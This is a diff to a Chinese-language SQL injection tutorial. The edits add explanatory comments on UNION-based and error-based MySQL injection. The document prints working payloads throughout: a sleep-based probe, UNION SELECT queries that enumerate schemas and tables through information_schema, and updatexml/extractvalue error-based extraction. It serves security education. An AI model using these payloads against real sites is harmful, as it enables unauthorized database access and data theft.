@@ -409,7 +409,7 @@ id=1;sleep(3)        （如有堆叠）或 id=1 and sleep(3)  → 响应明显�
 
 ```sql
 ?id=-1 union select 1,version(),database()
-?id=-1 union select 1,user(),@@version_compile_os
+?id=-1 union select 1,user(),@@version_compile_os #这里第3列可以随便填
 ```
 
 这里的 <span style="color:rgb(154, 56, 215)">`version()`</span>、<span style="color:rgb(154, 56, 215)">`database()`</span>、<span style="color:rgb(154, 56, 215)">`user()`</span> 都是第 7.3 节介绍过的内置函数，不是标识符，不加反引号。
@@ -422,7 +422,7 @@ MySQL 自带一个叫 `` `information_schema` `` 的库，记录了所有数据�
 -- 所有数据库名
 ?id=-1 union select 1,group_concat(`schema_name`),3 from `information_schema`.`schemata`
 
--- 当前库下所有表名
+-- 当前库下所有表名 **`table_schema`**：这是 `information_schema.tables` 表里的一个列名。它代表**“这张表属于哪个数据库”**
 ?id=-1 union select 1,group_concat(`table_name`),3 from `information_schema`.`tables` where `table_schema`=database()
 
 -- 某张表的所有列名
@@ -460,11 +460,11 @@ SELECT updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1);
 SELECT extractvalue(1, concat(0x7e, (SELECT user())));
 ```
 
-| 函数                                                            | 作用                       |
-| ------------------------------------------------------------- | ------------------------ |
-| <span style="color:rgb(154, 56, 215)">`updatexml()`</span>    | 第二参数格式不合法时，会把该参数内容带进报错信息 |
-| <span style="color:rgb(154, 56, 215)">`extractvalue()`</span> | 原理类似，同样利用参数解析报错回显数据      |
-| <span style="color:rgb(154, 56, 215)">`concat()`</span>       | 拼接字符串，这里用于拼出会触发报错的格式     |
+| 函数                                                            | 作用                                                                                                         |
+| ------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
+| <span style="color:rgb(154, 56, 215)">`updatexml()`</span>    | 第二参数格式不合法时，会把该参数内容带进报错信息      标准语法： updatexml(目标XML文档, 要修改的节点路径(XPath), 要替换成的新内容)  原本是用来修改 XML 文档里某个节点内容的。 |
+| <span style="color:rgb(154, 56, 215)">`extractvalue()`</span> | 原理类似，同样利用参数解析报错回显数据                                                                                        |
+| <span style="color:rgb(154, 56, 215)">`concat()`</span>       | 拼接字符串，这里用于拼出会触发报错的格式                                                                                       |
 
 读法：不需要记住原理细节，只要知道**这类函数的设计缺陷会把子查询的结果"打印"进报错信息**，攻击者就是利用这一点把想要的数据"带出来"。
 
